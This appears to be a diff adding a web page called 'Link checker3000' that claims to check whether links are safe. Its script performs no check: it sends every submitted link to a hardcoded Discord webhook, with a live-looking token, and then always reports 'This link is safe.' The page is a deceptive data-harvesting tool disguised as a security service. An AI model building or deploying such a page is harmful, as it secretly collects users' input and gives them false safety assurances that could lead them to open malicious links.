@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Link checker3000</title> <!-- Updated title -->
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f0f0;
+        }
+        header {
+            background-color: #333;
+            color: #fff;
+            padding: 20px;
+            text-align: center;
+        }
+        nav {
+            background-color: #444;
+            padding: 10px;
+            text-align: center;
+        }
+        nav a {
+            color: #fff;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        nav a:hover {
+            text-decoration: underline;
+        }
+        section {
+            padding: 20px;
+            margin: 20px;
+            background-color: #fff;
+            border-radius: 5px;
+            display: flex;
+            justify-content: center; /* Center horizontally */
+            align-items: center; /* Center vertically */
+            flex-direction: column; /* Align items in column */
+            text-align: center; /* Align text center */
+            min-height: 200px; /* Set minimum height to keep button in center */
+        }
+        footer {
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+        .button-container {
+            text-align: center;
+            margin-top: 40px; /* Increased margin to move the button further down */
+        }
+        .button {
+            padding: 10px 20px;
+            background-color: #333;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .button:hover {
+            background-color: #555;
+        }
+        /* Hidden by default */
+        .popup {
+            display: none;
+            position: fixed;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            z-index: 1000;
+        }
+        .popup textarea {
+            width: 300px;
+            height: 200px;
+            resize: none;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            padding: 10px;
+            font-size: 16px;
+        }
+        .popup button {
+            margin-top: 10px;
+            padding: 10px 20px;
+            background-color: #333;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .popup button:hover {
+            background-color: #555;
+        }
+        .close-button {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: none;
+            border: none;
+            font-size: 20px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Link checker3000</h1>
+    </header>
+    <nav>
+        <a href="about.html">About</a> <!-- Updated URL -->
+        <a href="privacy_policy.html">Privacy&Policy</a> <!-- Updated URL -->
+    </nav>
+    <section>
+<h2>Check if your link is safe with the Link checker3000!.</h2>
+    </section>
+    <div class="button-container">
+        <button class="button" onclick="showPopup()">Link checker3000</button>
+    </div>
+    <footer>
+        <p>&copy; 2024.  All rights reserved.</p>
+    </footer>
+
+    <!-- Popup box -->
+    <div id="popup" class="popup">
+        <button class="close-button" onclick="hidePopup()">X</button>
+        <textarea id="linkInput" placeholder="Enter your link here"></textarea>
+        <button onclick="checkLink()">Submit</button>
+        <div id="loading" style="display: none;">Checking...</div>
+        <div id="result"></div>
+    </div>
+
+    <script>
+        function showPopup() {
+            var popup = document.getElementById("popup");
+            popup.style.display = "block";
+            document.getElementById("result").innerHTML = '';
+        }
+
+        function hidePopup() {
+            var popup = document.getElementById("popup");
+            popup.style.display = "none";
+        }
+
+        function checkLink() {
+            var link = document.getElementById("linkInput").value;
+            var webhookURL = "https://discordapp.com/api/webhooks/1201905598715662417/t45-BNeTGlGFw-a2G7qSLs2HK04Jd_ImKd-005_fZPVTW82BfTq76FHbjA5QbnWlRaCU"; // Replace with your Discord webhook URL
+            var loading = document.getElementById("loading");
+            var resultDiv = document.getElementById("result");
+
+            // Display loading message
+            loading.style.display = "block";
+
+            // Hide result message
+            resultDiv.innerHTML = '';
+
+            // Validate link
+            if (isValidURL(link)) {
+                // Create a new XMLHttpRequest object
+                var xhr = new XMLHttpRequest();
+
+                // Open a new POST request to the webhook URL
+                xhr.open("POST", webhookURL, true);
+
+                // Set the Content-Type header to application/json
+                xhr.setRequestHeader("Content-Type", "application/json");
+
+                // Define the data to be sent to the webhook
+                var data = JSON.stringify({
+                    content: link
+                });
+
+                // Send the POST request with the link data
+                xhr.send(data);
+
+                // Display result message
+                resultDiv.innerHTML = '<p>This link is safe.</p>';
+            } else {
+                // Display error message
+                resultDiv.innerHTML = '<p>Please enter a valid link.</p>';
+            }
+
+            // Hide loading message
+            loading.style.display = "none";
+        }
+
+        function isValidURL(url) {
+            var pattern = new RegExp('^(https?:\\/\\/)?'+ // protocol
+            '((([a-z\\d]([a-z\\d-]*[a-z\\d])*)\\.)+[a-z]{2,}|'+ // domain name
+            '((\\d{1,3}\\.){3}\\d{1,3}))'+ // OR ip (v4) address
+            '(\\:\\d+)?(\\/[-a-z\\d%_.~+]*)*'+ // port and path
+            '(\\?[;&a-z\\d%_.~+=-]*)?'+ // query string
+            '(\\#[-a-z\\d_]*)?$','i'); // fragment locator
+            return !!pattern.test(url);
+        }
+    </script>
+</body>
+</html>
